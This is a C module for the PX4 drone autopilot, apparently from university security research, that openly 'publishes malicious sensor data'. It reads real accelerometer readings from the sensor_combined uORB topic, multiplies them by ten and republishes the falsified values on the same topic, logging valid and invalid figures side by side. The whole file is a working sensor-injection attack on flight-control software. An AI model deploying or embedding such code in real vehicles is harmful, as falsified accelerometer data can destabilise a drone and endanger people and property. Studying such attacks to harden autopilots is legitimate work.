/**
 * @file MESL_01.c
 * Publishing malicious sensor data
 * @author korkeep <korkeep@khu.ac.kr>
 */

#include <px4_platform_common/px4_config.h>
#include <px4_platform_common/tasks.h>
#include <px4_platform_common/posix.h>
#include <unistd.h>
#include <stdio.h>
#include <poll.h>
#include <string.h>
#include <math.h>

#include <uORB/uORB.h>
#include <uORB/topics/vehicle_acceleration.h>
#include <uORB/topics/vehicle_attitude.h>
#include <uORB/topics/sensor_combined.h>

__EXPORT int MESL_01_main(int argc, char *argv[]);

int MESL_01_main(int argc, char *argv[])
{
	PX4_INFO("MESL_01: Publishing malicious accelerometer data");

	/* subscribe to vehicle_acceleration topic */
	int sensor_sub_fd = orb_subscribe(ORB_ID(sensor_combined));
	/* limit the update rate to 5 Hz */
	orb_set_interval(sensor_sub_fd, 200);

	/* one could wait for multiple topics with this technique, just using one here */
	px4_pollfd_struct_t fds[] = {
		{ .fd = sensor_sub_fd,   .events = POLLIN },
		/* there could be more file descriptors here, in the form like:
		 * { .fd = other_sub_fd,   .events = POLLIN },
		 */
	};

	int error_counter = 0;

	for (int i = 0; i < 50; i++) {
		/* wait for sensor update of 1 file descriptor for 250 ms */
		int poll_ret = px4_poll(fds, 1, 250);

		/* handle the poll result */
		if (poll_ret == 0) {
			/* this means none of our providers is giving us data */
			PX4_ERR("Got no data within a second");

		} else if (poll_ret < 0) {
			/* this is seriously bad - should be an emergency */
			if (error_counter < 10 || error_counter % 50 == 0) {
				/* use a counter to prevent flooding (and slowing us down) */
				PX4_ERR("ERROR return value from poll(): %d", poll_ret);
			}

			error_counter++;

		} else {
			if (fds[0].revents & POLLIN) {
				/* obtained data for the first file descriptor */
				struct sensor_combined_s accel;
				/* copy sensors raw data into local buffer */
				orb_copy(ORB_ID(sensor_combined), sensor_sub_fd, &accel);
				PX4_INFO("Valid Accel:\t%8.4f\t%8.4f\t%8.4f",
					 (double)accel.accelerometer_m_s2[0],
					 (double)accel.accelerometer_m_s2[1],
					 (double)accel.accelerometer_m_s2[2]);

				/* set and publish malicious data */
				struct sensor_combined_s accel_x_10;
				accel_x_10.accelerometer_m_s2[0] = accel.accelerometer_m_s2[0]*10;
				accel_x_10.accelerometer_m_s2[1] = accel.accelerometer_m_s2[1]*10;
				accel_x_10.accelerometer_m_s2[2] = accel.accelerometer_m_s2[2]*10;
				
				orb_advert_t accel_pub = orb_advertise(ORB_ID(sensor_combined), &accel_x_10);
				orb_publish(ORB_ID(sensor_combined), accel_pub, &accel_x_10);
				
				PX4_INFO("Invalid Accel:\t%8.4f\t%8.4f\t%8.4f",
					 (double)accel_x_10.accelerometer_m_s2[0],
					 (double)accel_x_10.accelerometer_m_s2[1],
					 (double)accel_x_10.accelerometer_m_s2[2]);
			}
		}
	}
	return 0;
}
